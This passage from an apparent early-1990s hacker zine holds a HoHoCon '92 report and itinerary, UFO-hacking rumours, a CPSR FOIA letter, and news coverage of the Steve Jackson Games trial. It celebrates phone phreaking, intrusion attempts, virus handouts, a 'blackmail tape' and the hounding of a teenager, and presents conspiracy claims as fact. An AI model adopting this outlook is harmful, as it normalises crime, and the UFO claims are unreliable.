everyone at the convention.  A large portion of those in attendance
left as soon as he got up.  They were the unlucky ones.  Draper, for all his
oddities, is an intriguing speaker.  His life has been quite rich with
excitement and when he can actually focus on a subject he is captivating.
He spoke on his trip to the Soviet Union where he met computer and telephone
enthusiasts in Moscow.  He spoke on his unfortunate involvement with
Bill SF and the BART Card duplication scandal.  He spoke, with obvious
longing, of the good old days of blue boxing, and stacking tandems to
obtain local trunks, and on verification circuitry.

Listening to Draper talk really brought me back to my beginnings.  I could
hear in my head the "cachink-chink" of a tandem waiting for MF.  I remembered
stacking tandems to Europe and back to call my other line.  I remembered
the thrill of finding never before known trunks and exploring their
connections.  I fell into a deep nostalgic high, and walked up to John
to tell him thanks.  As I extended my hand to him, he mumbled something
unintelligible and wandered off.  So much for paying respect.

About ten of us took off to Chuy's for dinner:  Me, Chasin, Conflict,
Rambone, Dispater, Blue Adept, Minor Threat and reporters Joe Abernathy
and Gary Poole were among the diners.  Everyone ate heartily and listened
to cordless telephone conversations on Rogue Agent's handheld scanner.
One conversation was between what appeared to be a "pimp" talking to his
"ho" about some money owed him by another in his flock.  The conversation
drifted to the Dallas man who had terrorized an entire neighborhood some
months back with prank phone calls.  Conflict and Dispater repeated a
few of the choicest of the calls for our amusement.

Back at the hotel, Dr. Hoffman's Problem Child had escaped, and several
casualties were reported.

Conflict, Chasin and I barricaded ourselves in our room and went on a lengthy
stream of consciousness rant about what we needed out of life.  Our absolute
essentials were reduced to a small room with a computer hooked into the
Internet, a specially designed contour chair, a small hole through which
a secretary would give us food, virtual reality sex toys, and a toilet.
(Chasin suggested no toilet, but a catheter so we would never have to move.)
Gary Poole was quietly stunned in the corner of the room making mental notes.

Much of the con had moved into a suite that had been converted into a
mass computing arena.  Several attendees from Pittsburgh had turned their
room into a lab with four Unix workstations with several terminals throughout
the room including the bathroom!  These were hooked into the Internet through
a slip connection that had been rigged somewhere.  It was quite a site.
The room was usually completely packed and smelled like a smoky gymnasium.

(It was rumored that after Chasin and I spoke on the UFO conspiracy, several
hackers began their attempts at penetrating the Ames Research Lab.  No
reports back on their success.)

After I finished copying several Traci Lords video tapes (ahem) I relinquished
control of the decks to a room downstairs.  Dispater played a video
manipulation he and Scott Simpson had produced.  They had found a TRW training
video tape during a trashing run and dubbed in their own dialogue.  (You'd
have to see it to fully understand.)

After that, I played a few tapes of my own.  The first was a short film called
"Red," that chronicled the abusive prank phone calls directed at a bartender.
The film had the actual phone call tapes played with video stills.  (Guess
where the Simpsons came up with that nifty idea...)

Following "Red," someone heard on the scanner that the guard was answering
a large noise disturbance in the room we were in.  (Yes, they had the hotel
guard's 2-meter frequencies.)  Everyone moved into another room before the
guard showed up.  He was thoroughly confused.

In the next room I played the ultimate in shock, the sequel to the movie that
I had disturbed the entire con with last year, "Nekromantik II."  I won't
go into any detail, since the title says it all.  Once again, I reign as
the sickest person at HoHoCon, this honor bestowed upon me by everyone
who witnessed the showing.

As things winded down, several people ended up back in our room to waste
away the last few hours of the night.  Several people returned from an
adventure to "an abandoned hospital."  No one really understood what they went
to, but it sounded disturbing.  Later, that same group would leave to
go climb "an abandoned grain storage tower."  Go figure.

Approximately 2:00 am, a local hacker named Zach showed up.  Scott had a few
words for Zach, as did most everyone at the Con.  Zach lived in a fantasy
land where he was a top notch security consultant with high paying clients
in the telecommunications industry.  He also like to name drop names like
Chasin and Goggans as his partners and as people who would swoop down
and terrorize the people he had any problems with.  He also liked to turn
in, or threaten to turn in any of his rivals in the software pirating
community.  He also like to proposition young boys both in person and
over the phone.  At 17, Zach had a few problems.

Trapped in the corner of the room, Zach endured about an hour of questioning
and accusations (all of which he truly deserved.)  Eventually Zach left,
apparently not affected by the ordeal at all.  We attributed this to his
overly apparent schizophrenia brought on by denial of his sexual
tendencies.

Later that night the Pittsburgh gang blew out the power in their entire
wing.  One was overheard, "Hmmm...guess we should have known that when the
power strips kept melting that we were drawing too much power."

The next morning everyone gathered up their gear and said so long.  All but
a few who gathered in a room marked "the suite of the elite."  Armed with
a nitrous oxide blaster, everyone sat around and viewed the con through
the roaming video eye of Jesse, who had managed to capture everyone
in some kind of compromising position.  He will be selling them off
after he edits it a bit.  It was dubbed "The Blackmail Tape."

In my opinion this year was much less anarchistic than last year.  The
convention might not even be banished from this hotel.  (Yeah, right.)
There were no raids, there were no overtly violent or satanic acts,
no fire alarms, no trashing runs (that I saw), no fights,
and there were no strippers (alas).  The conference portion of the
event was much better organized, there was much more interesting
information to be shared, and was well worth the distances traveled by
all.

This was HoHoCon '92.

--------------------------

                 H*O*H*O*C*O*N '92

                 Frosty's Itinerary

Thursday 8pm  Take off and go bar hopping all night long to build up
              stamina for the convention.

Thrusday 10pm Quit bar hopping and waste shitloads of money at the
              casinos in feeble attempts to get gas money for the trip.

Friday   5am  Leave the casino and decide to get some sleep after spending
              hours to win a meager $10 over starting cash.

Friday   8am  Wake up and decide to pack for the trip.  Forget necessities
              that we couldn't live without.  Remember to bring junk food.

Friday   9am  Stuff assembled GCMS members into subcompact Japanese micro
              car and leech as much gas money out of them as possible.

Friday   2pm  Stop at the friendly convenient store to rob it of precious
              sugar-coated necessities and obtain mucho lotto tickets.

Friday   4pm  Endure Windrunner's gruelling multi-hour long verbatim
              rantings of taking the Purity Test 1500 verbally.

Friday   7pm  Pull out many maps and try to find the damn hotel in Houston.

Friday   9pm  Arrive at the hotel getting a room for one (car stuffed
              with people sits outside the lobby).  Request two keys.

Friday  10pm  Test the smoke machine on the hotel grounds.  Chase young
              code-kids out of your way, threatening to disable their
              phones.

Friday  11pm  Crash in room from lack of sleep.  Kick other members out
              of your way.  Ignore multiple alcoholic beverages lining
              the room.  Ponder what's sleeping in the chair briefly.

Saturday ???  Try to figure out if you're awake or dead.  Take a collection
              from those that are still alive.  Run to some micro-compact
              Japanese convenience store hidden in the middle of suburbia
              hell and obtain sugar-coated nutrients with Windrunner and
              JunkMaster and Gaijin.

Saturday 1pm  Arrive for the conference.  Get mega-amounts of raffle tickets.

Saturday 2pm  Conference actually gets started a few hours behind schedule.
              Tape conversations from the man with the whisper 2000 home
              version.  Ponder the light orbiting Erik B's head.

Saturday 4pm  Witness Steve Ryan in action against the hotel staff.
              Wonder where the young hack in the corner got the gallon,
              mostly empty now, of wine.  Ponder if he's going to spew.

Saturday 6pm  Try to figure out what everyone is going to do with the
              several hundred flashing construction lights given out.
              Calculated the ratio of men to women as 15,000:1, roughly.

Saturday 8pm  Try to keep awake while wondering how much torture can be
              sustained.  Watch Count Zero nodding off.  Hitman and I
              pulled out our decoder rings to interpret Crunch's hidden
              message.

Saturday 10pm Dominoes Pizza makes it to the room.  OUR SAVIOR !!!  He's
              5-minutes late.  Custody battle over the pizza ensues.  The
              manager is called, at which point he lowers the $50 price
              for the two pizzas down to $30.  We scrape a few dollars and
              hand the peon delivery boy some cheap beer.

Saturday Nite Hand out copies of "cindy's torment" to the code kids.
              Watch Erik B.'s continuation of necrophiliac desires on
              the acquired VCR that mysteriously appeared.  Avoided the
              hotel security by changing room while monitoring their
              frequencies (thanks RDT).  Obtained evidence that hackers
              were breaking into VR R&D departments to engage in endless
              routines of VR sex for Cyborgasmic responses.  Saw Crunch's
              host's room blow out as the multitudes of computers fry the
              circuits.  Followed the 'sheep' about the hotel.

Sunday ???    Woke bright and early to a car locked with the keys inside.
              Fortunately, 50-odd slim-jims appeared out of nowhere to
              save the day.  Windrunner chauffeured us back to our lair.

Sunday 3pm    Hacked into the Louisiana Lotto machine from an acoustical
              modem and laptop from a pay phone to rig the numbers and
              then bought a ticket.

Sunday 7pm     Returned to hell.  Lost the lotto ticket in the growing
               pile of sugar-coated necessities sheddings.  Cursed.

Sunday 8pm     Turned the PC on and hit the networks.


--------------------------

Jim Carter, president of Bank Security in Houston, TX, wrote the
following impressions of HoHoCon for Security Insider Report
(December, 1992)

HoHoCon was in fact "Unphamiliar Territory" for this "good ole boy,"
but it didn't take long till I was into the swing of things and
telling lies of how we cheat and steal to get our information.  Of
course, everyone who talked to this "good ole boy" thought he was with
one of the three letter agencies.  As the stories rolled on about what
they (the hackers) could do, such as produce virii that would cause
video display terminals and hard drives to smoke, I had to sit back, sip
my brewski and say "wow."  We sat back, enjoyed a few more rounds, told
a few more lies and had a good time.

Well, this old boy didn't show until about noon on Saturday.  Of course
the conference hadn't started yet so we didn't miss anything.  The
program was kicked off with a number of questions about who, what, where
and how.  It was difficult to determine how many people were there since
the room was packed like a can of sardines.  Our estimate was over two
hundred, not counting the hackers still in their rooms.  Was this
another drunken free for all, as in the past?  A report was given on
cellular hacking and toll fraud.  Hackers' rights were presented by an
attorney.  Also discussed was the stupidity of the press and law
enforcement.

Some others talked about suppressed information from the federal
government concerning UFO's and how hackers are gaining this info.  And
of course the White House wants to know their sources.

Hand outs were given including virii and virus source code.  I did
decline any virii, but who knew what I would get before this was over.
I believe this was the most responsive and gratifying group I have
spoken to this year.  I also expect to get more business because of this
presentation than any other this year.

A lengthy door prize was held in which I was the winner of more virii.
Again, I did decline, but passed the winning ticket on.  Captain Crunch
was the final speaker.  In conclusion, the attendees were the good, the
bad and the ugly.  We did find HoHoCon very informative and, yes, we
will attend again.  In closing, I hope each and everyone had a very
"Merry HoHoCon."

Rumors have begun to surface about a group of hackers who were involved in a
project to uncover information regarding the existence of UFOs.  The
most public example pertaining to this alleged project was seen on
Dateline NBC on the screen of the mystery hacker "Quentin."

The story goes that this group of individuals decided to put their
skills to work on a project that, if successful, would add legitimacy to
the hacking process by uncovering information on what has been called the
greatest cover-up in the history of the world.  Milnet TAC ID cards
were obtained through military officials sympathetic to the cause. Several
sites and networks were targeted that had in the past been linked to UFO
activity.  These were sites like the Jet Propulsion Laboratory, Sandia Labs,
TRW Space Research, American Institute of Physics, and various other
educational, government and military sites.

The rumors also emphasize that several sites had what these individuals
called "particularly heavy security."  Within several seconds after
connection had been established, system administrators of sites used in
this project were contacted.  Further rumors state that there was
information regarding a propulsion system designed utilizing what is
termed "corona discharge" being analyzed at one site.  The most sinister
of all rumors states that one particular participant who was allegedly
deeply immersed in TRWs internal network has not been heard from since
uncovering data regarding a saucer being housed at one of their Southern
California installations.

Believe what you will about the reality of this project.  Much will be
dismissed as hacker lore, but within the core of every rumor lies a
grain of truth.

Are we being lied to?  Why is this information still classified by the NSA?
What are they hiding from us behind a maze of security?  Will we continue
to stand idly by and let an uncaring and deliberately evasive government
shield us from what may be the most important, and potential dangerous
news to ever surface?  Information wants to be free, and only a
concerted group effort can make this happen.  How much do you really
want to know about what is really going on?

What follows is information that has been released regarding this project...

These are the raw data.  Where comments are appropriate, they
will be included.  The data will be grouped together with dates,
names etc. to make correlations easier.

There are countless references to the aliens, their down space
craft and what the Government is doing with them.
If, as is supposed, the research on the craft and the 'ufonauts'
continues today, then undoubtedly there are computer records, somewhere.

              STEVE JACKSON GAMES v. UNITED STATES SECRET SERVICE

 Rights To Be Tested In Computer Trial                         January 20, 1993

                        Summary Judgment Denied In Case

AUSTIN -- A judge Tuesday denied plaintiff lawyers' request for summary
judgment in a case brought against the U.S. Secret Service to set the bounds of
constitutional protections for electronic publishing and electronic mail.

U.S. District Judge Sam Sparks acted after hearing complicated arguments
regarding application of 1st and 4th Amendment principles in  computer-based
communications and publishing.  The case will go to trial at 9 a.m. today.

"Uncontested facts show the government violated the Privacy Protection Act and
the Electronic Communications Privacy Act," said Pete Kennedy, attorney for
Steve Jackson Games, an Austin game company that brought the lawsuit.

Mark W. Batten, attorney for the Department of Justice, which is defending the
Secret Service, declined to comment on the proceedings.

Steve Jackson's company, which publishes fantasy role-playing games -- not
computer games -- was raided by the Secret Service on March 1, 1990, during a
nationwide sweep of suspected criminal  computer hackers.

Agents seized several computers and related hardware from the company and from
the Austin home of Steve Jackson employee Loyd Blankenship.  Taken from the
game publisher was an electronic bulletin board used to play-test games before
they were printed and exchange electronic mail with customers and free-lance
writers.

Another seized computer contained the text of the company's work in progress,
GURPS Cyberpunk, which was being prepared for the printers.

Blankenship's purported membership in the Legion of Doom -- a group of computer
hackers from Austin, Houston and New York -- led the Secret Service to Steve
Jackson's door.

Neither Jackson nor his company was suspected of wrongdoing.

The game publisher is named in two paragraphs of the 42-paragraph affidavit
requesting the 1990 search warrant, which targeted Blankenship -- a fact
Kennedy cited in seeking summary judgment.

Kennedy presented evidence that the original Secret Service affidavit for the
warrant used to raid Steve Jackson Games contained false statements.
Supporting documentation showed that Bellcore expert Henry Kluepfel disputes
statements attributed to him that accounted for the only link between Steve
Jackson Games and the suspicion Blankenship was engaged in illegal activity.

Batten came away visibly shaken from questioning by Sparks, and later had a
tense exchange with Kennedy outside the courtroom.

The lawsuit contends the government violated 1st Amendment principles by
denying the free speech and public assembly of callers to Jackson's bulletin
board system, Illuminati.  This portion of the complaint was brought under the
Privacy Protection Act, which also covers the seized Cyberpunk manuscripts --
if the judge rules that such a book, stored electronically prior to
publication, is entitled to the same protections as a printed work.
The government lawyers argued the Privacy Protection Act applies only to
journalistic organizations -- an argument Sparks didn't seem to buy.

The lawsuit also contends 4th Amendment principles providing against
unreasonable search and seizure were violated, on grounds the Electronic
Communications Privacy Act specifies protection for publishers.

The Justice Department contends electronic mail does not enjoy constitutional
protections.

"They (users of Illuminati) had no expectation of privacy in their electronic
mail messages," Batten said.  The basis of the argument is that Illuminati's
callers were not sending communications to others, but rather "revealing" them
to a third party, Steve Jackson, thus negating their expectation of privacy.

 Computer Case Opens; Agent Admits Errors                      January 27, 1993
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 by Joe Abernathy (The Houston Chronicle)(Page A11)
 *Reprinted With Permission*

AUSTIN -- Plaintiff's attorneys wrested two embarrassing admissions from the
U.S. Secret Service on the opening day of a federal civil lawsuit designed to
establish constitutional protections for electronic publishing and electronic
mail.

Special Agent Timothy Folly of Chicago admitted that crucial statements were
erroneous in an affidavit he used to obtain warrants in a 1990 crackdown on
computer crime.

Foley also conceded that the Secret Service's special training for computer
crime investigators overlooks any mention of a law that limits search-and-
seizure at publishing operations.

The case before U.S. District Judge Sam Sparks was brought by Steve Jackson
Games, an Austin game publisher, with the support of electronic civil rights
activists who contend that federal agents have overstepped constitutional
bounds in their investigations of computer crime.

Jackson supporters already have committed more than $200,000 to the litigation,
which seeks $2 million in damages from the Secret Service and other defendants
in connection with a March 1990 raid on Jackson Games.

Plaintiffs hope to establish that First Amendment protections of the printed
word extend to electronic information and to guarantee privacy protections for
users of computer bulletin board systems, such as one called Illuminati that
was taken in the raid.

Steve Jackson's attorney, Jim George of Austin, focused on those issues in
questioning Foley about the seizure of the personal computer on which
Illuminati ran and another PC which contained the manuscript of a pending
Jackson Games book release, "GURPS Cyberpunk."

"At the Secret Service computer crime school, were you, as the agent in charge
of this investigation, made aware of special rules for searching a publishing
company?"  George asked Foley.  He was referring to the Privacy Protection Act,
which states that police may not seize a work in progress from a publisher.  It
does not specify what physical form such a work must take.

Foley responded that the Secret Service does not teach its agents about those
rules.

Earlier, Foley admitted that his affidavit seeking court approval to raid
Jackson Games contained an error.

During the raid -- one of several dozen staged that day around the country in
an investigation called Operation Sun Devil -- agents were seeking copies of a
document hackers had taken from the computer system of BellSouth.

No criminal charges have been filed against Jackson, his company, or others
targeted in several Austin raids.  The alleged membership of Jackson employee
Loyd Blankenship in the Legion of Doom hacker's group -- which was believed
responsible for the BellSouth break-in -- lead agents to raid Jackson Games at
the same time that Blankenship's Austin home was raided.

Foley's affidavit stated that Bell investigator Henry Kluepfel had logged on to
the Illuminati bulletin board and found possible evidence of a link between
Jackson Games and the Legion of Doom.

But George produced a statement from Kluepfel, who works for Bellcore, formerly
AT&T Bell Labs, disputing statements attributed to him in the affidavit.  Foley
acknowledged that part of the affidavit was erroneous.

The U.S. Department of Justice, which is defending the Secret Service, contends
that only traditional journalistic organizations enjoy the protections of the
Privacy Protection Act and that users of electronic mail have no reasonable
expectation of privacy.

 Judge Rebukes Secret Service For Austin Raid                  January 29, 1993
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 by Joe Abernathy (The Houston Chronicle)(Page A21)
 *Reprinted With Permission*

AUSTIN -- A federal judge lambasted the U.S. Secret Service Thursday for
failing to investigate properly before it seized equipment from three Austin
locations in a 1990 crackdown on computer crime.

U.S. District Judge Sam Sparks' comments came on the final day of trial in a
lawsuit brought by Steve Jackson Games, an Austin publisher, with the support
of national computer rights activists.

The judge did not say when he will issue a formal ruling in the case.  In
addition to seeking $ 2 million in damages from the Secret Service and other
defendants, Jackson hopes to establish privacy and freedom of the press
protections for electronic information.

In a packed courtroom Thursday morning, Sparks dressed down Secret Service
Special Agent Timothy Foley of Chicago, who was in charge of the March 1, 1990,
raid on Jackson, one of his employees and a third Austin man.  No criminal
charges have been filed in connection with the raids.

"The Secret Service didn't do a good job in this case," Sparks said.  "We know
no investigation took place.  Nobody ever gave any concern as to whether
(legal) statutes were involved.  We know there was damage (to Jackson)."

The Secret Service has seized dozens of computers since the nationwide
crackdown began in 1990, but Jackson, a science fiction magazine and game book
publisher, is the first to challenge the practice.  A computer seized at
Jackson Games contained the manuscript for a pending book, and Jackson alleges,
among other things, that the seizure violated the Privacy Protection Act, which
prohibits seizure of publishers' works in progress.

Agents testified that they were not trained in that law at the special Secret
Service school on computer crime.

Sparks grew visibly angry when testimony showed that Jackson never was
suspected of a crime, that agents did no research to establish a criminal
connection between the firm and the suspected illegal activities of an
employee, and that they did not determine that the company was a publisher.

"How long would it have taken you, Mr. Foley, to find out what Steve Jackson
Games  did, what it was? " asked Sparks.  "An hour?

"Was there any reason why, on March 2, you could not return to Steve Jackson
Games a copy, in floppy disk form, of everything taken?

"Did you read the article in Business Week magazine where it had a picture of
Steve Jackson -- a law-abiding, tax-paying citizen -- saying he was a computer
crime suspect?

"Did it ever occur to you, Mr. Foley, that seizing this material could harm
Steve Jackson economically? "

Foley replied, "No, sir," but the judge offered his own answer:

"You actually did; you just had no idea anybody would actually go out and hire
a lawyer and sue you."

The judge's rebuke apparently convinced the government to close its defense
after the testimony from Foley, only one of several government witnesses on
hand.  Justice Department attorney Mark Battan entered subdued testimony
seeking to limit the award of monetary damages.

The judge's comments came after cross-examination of Foley by Pete Kennedy,
Jackson's attorney.

Sparks questioned Foley about the raid, focusing on holes in the search
warrant, why Jackson was not allowed to copy his work in progress after it was
seized, and why his computers were not returned after the Secret Service
analyzed them.

"The examination took seven days, but you didn't give Steve Jackson's computers
back for three months.  Why?" asked Sparks.

"So here you are, with three computers, 300 floppy disks, an owner who was
asking for it back, his attorney calling you, and what I want to know is why
copies of everything couldn't be given back in days.  Not months.  Days.

"That's what makes you mad about this case."

Besides alleging that the seizure violated the Privacy Protection Act, Jackson
alleged that since one of the computers was being used to run a bulletin board
system containing private electronic mail, the seizure violated the Electronic
Communications Privacy Act.

Justice Department attorneys have refused comment on the case, but contended in
court papers that Jackson Games is a manufacturer, and that only journalistic
organizations can call upon the Privacy Protection Act.

The government said that seizure of an electronic bulletin board system does
not constitute interception of electronic mail.

The Electronic Frontier Foundation committed more than $200,000 to the Jackson
suit.  The EFF was founded by Mitchell Kapor of Lotus Technology amid a
computer civil liberties movement sparked in large part by the Secret Service
computer crime crackdown that included the Austin raids.

"The dressing down of the Secret Service for their behavior is a major
vindication of what we've been saying all along, which is that there were
outrageous actions taken against Steve Jackson that hurt his business and sent
a chilling effect to everyone using bulletin boards, and that there were larger
principles at stake," said Kapor, contacted at his Cambridge, Massachusetts
office.

Shari Steele, who attended the trial as counsel for the EFF, said, "We're very
happy with the way the case came out.  That session with the judge and Tim
Foley is what a lawyer dreams about."

 Feds Sued Over Hacker Raid At Mall                            February 5, 1993

  gathering of readers of "2600 Magazine" at the Pentagon City Mall was
  disrupted on November 6, 1992, when mall security and Arlington County
  Police questioned and searched the attendees.

  The suit was filed by the Computer Professionals for Social

  The Secret Service declined to comment on the matter.]

[New Info in 2600 Case - from email sent by CPSR]

     One month after being sued under the Freedom of Information
Act (FOIA), the Secret Service has officially acknowledged that
it possesses "information relating to the breakup of a meeting
of individuals at the Pentagon City Mall in Arlington, Virginia."
The admission, contained in a letter to Computer Professionals for
Social Responsibility (CPSR), confirms widespread suspicions that
the agency played a role in the detention and search of
individuals affiliated with "2600" Magazine at the suburban
Washington mall on November 6, 1992.

     CPSR filed suit against the Secret Service on February 4
after the agency failed to respond to the organization's FOIA
request within the statutory time limit.  In its recent response,
the Secret Service released copies of three news clippings
concerning the Pentagon City incident but withheld other
information "because the documents in the requested file contain
information compiled for law enforcement purposes."  While the
agency asserts that it possesses no "documentation created by the
Secret Service chronicling, reporting, or describing the breakup
of the meeting," it does admit to possessing "information provided
to the Secret Service by a confidential source which is
information relating to the breakup of [the] meeting."  Federal
agencies classify other law enforcement agencies and corporate
entities, as well as individuals, as "confidential sources."

     The propriety of the Secret Service's decision to withhold
the material will be determined in CPSR's pending federal lawsuit.
A copy of the agency's letter is reprinted below.

Dear Mr. Sobel:

This is in response to your Freedom of Information Act (FOIA)
request for access to "copies of all records related to the
breakup of a meeting of individuals affiliated with "2600
Magazine" at the Pentagon City Mall in Arlington, Virginia on
November 6, 1992."

Enclosed, please find copies of materials which are responsive to
your request and are being released to you in their entirety.

Other information has been withheld because the documents in the
requested file contain information compiled for law enforcement
purposes.  Pursuant to Title 5, United States Code, Section
552(b)(7)(A); (C); and (D), the information has been exempted
since disclosure could reasonably be expected to interfere with
enforcement proceedings; could reasonably be expected to
constitute an unwarranted invasion of personal privacy to other
persons; and could reasonably be expected to disclose the
identity of a confidential source and/or information furnished by
a confidential source.  The citations of the above exemptions are
not to be construed as the only exemptions that are available
under the Freedom of Information Act.

In regard to this matter it is, however, noted that your FOIA
request is somewhat vague and very broadly written.  Please be
advised, that the information being withheld consists of
information provided to the Secret Service by a confidential
source which is information relating to the breakup of a meeting
of individuals at the Pentagon City Mall in Arlington, Virginia,
and, therefore, appears to be responsive to your request as it
was written. If, however, the information you are seeking is
information concerning the Secret Service's involvement in the
breakup of this meeting, such as any type of documentation
created by the Secret service chronicling, reporting, or
describing the breakup of the meeting, please be advised that no
such information exists.

If you disagree with our determination, you have the right of
administrative appeal within 35 days by writing to Freedom of
Information Appeal, Deputy Director, U. S. Secret Service,
1800 G Street, N.W., Washington, D.C. 20223.  If you choose to
file an administrative appeal, please explain the basis of your
appeal.

                                    Sincerely,

                                    /Sig/

[At the National Computer Security Association convention in San

  The panel decided that hacker bonding came from a missing or defective
  family.  The panel also decided that hackers weren't necessarily
  geniuses, and that a few weeks of study would be enough to begin.

  Panel member Winn Schwartau stated that there should be an end to
  slap-on-the-wrist penalties.  Sending hackers to jail would send a
  clear message to other hackers, according to Schwartau.

  "What strikes me about hackers is their arrogance," said Michael
  Kabay, computer security consultant from Montreal.  "These people seem
  to feel that their own pleasures or resentments are of supreme
  importance and that normal rules of behavior simply don't apply to
  them."]
